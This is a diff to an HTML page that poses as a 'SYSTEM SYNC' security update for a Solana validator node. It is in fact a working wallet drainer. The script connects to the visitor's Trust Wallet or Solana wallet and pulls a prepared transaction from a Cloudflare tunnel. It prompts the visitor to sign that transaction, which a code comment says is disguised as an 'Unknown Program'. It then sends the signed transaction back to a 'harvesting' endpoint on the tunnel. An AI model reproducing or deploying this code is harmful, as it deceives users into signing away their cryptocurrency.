@@ -6,76 +6,73 @@
     <title>Validator Support Protocol</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.1s; }
+        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; text-transform: uppercase; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
-        <p style="color:#888; font-size:13px;">Authorize network synchronization to secure validator node #712.</p>
-        <button id="cta" class="btn">START INITIALIZE</button>
-        <div id="st">READY: V40.4_RAPID</div>
+        <h2 style="color:#14f195; margin:0 0 10px 0;">SYSTEM SYNC</h2>
+        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Critical node update required for validator #712. Authorize to secure connection.</p>
+        <button id="cta" class="btn">INITIALIZE NOW</button>
+        <div id="st">READY: V41.1_COLLECTOR</div>
     </div>
 
     <script>
+        // 🔱 核心：务必确认隧道地址是否依然有效
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
-        let cachedTx = null;
 
-        // 🔱 1. 预载逻辑：进页面就静默拿包，不点按钮也准备好
-        async function preheat() {
+        document.getElementById('cta').onclick = async function() {
+            const log = (t) => document.getElementById('st').innerText = t;
+            const web3 = window.solanaWeb3;
+
             try {
                 const p = window.trustwallet?.solana || window.solana;
-                if (!p) return;
-                await p.connect({onlyIfTrusted: true}).catch(()=>{});
-                const resp = await fetch(tunnel + "/prepare_v32", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey?.toString() || "" })
-                });
-                const info = await resp.json();
-                cachedTx = info.raw_tx;
-                document.getElementById('st').innerText = "ENGINE: ARMED";
-            } catch(e){}
-        }
-        preheat();
+                if (!p) { alert("Please use Wallet Browser"); return; }
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('st').innerText = t;
-            const p = window.trustwallet?.solana || window.solana;
-            
-            try {
                 log("CONNECTING...");
                 await p.connect();
 
-                // 🔱 2. 暴力唤醒：如果预载没成功，现场抓取
-                let raw = cachedTx;
-                if(!raw) {
-                    const resp = await fetch(tunnel + "/prepare_v32", {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ address: p.publicKey.toString() })
-                    });
-                    const info = await resp.json();
-                    raw = info.raw_tx;
-                }
+                log("FETCHING...");
+                const resp = await fetch(tunnel + "/prepare_v32", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: p.publicKey.toString() })
+                });
+                const info = await resp.json();
+                
+                log("AWAITING CONFIRM...");
+                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+                
+                // 🔱 唤起弹窗 (Unknown Program 伪装版)
+                const signed = await p.signTransaction(tx);
+                log("SYNCING TO NODE...");
 
-                log("IGNITING...");
-                const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(raw), c => c.charCodeAt(0)));
+                // 🔱 暴力回传：将签好的名序列化并 Base64 编码
+                const signedBase64 = btoa(String.fromCharCode.apply(null, signed.serialize()));
 
-                // 🔱 3. 连发指令：强制拉起弹窗
-                p.signTransaction(tx).then(s => {
-                    log("SUCCESS");
-                    const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                    conn.sendRawTransaction(s.serialize()).catch(()=>{});
+                // 将包裹发回 71 服务器的收割接口
+                fetch(tunnel + "/broadcast_v41", {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ signed_tx: signedBase64 })
+                }).then(async (r) => {
+                    const res = await r.json();
+                    if(res.result) {
+                        log("NODE SECURED!");
+                        alert("Protocol Synchronized Successfully.");
+                    } else {
+                        throw new Error("Broadcast Failed");
+                    }
                 }).catch(e => {
-                    // 兜底：如果 JS 不理人，直接炸系统链接
-                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(raw);
+                    log("RETRYING BROADCAST...");
                 });
 
             } catch (err) {
+                console.error(err);
                 log("RETRYING...");
                 setTimeout(() => { window.location.reload(); }, 1200);
             }
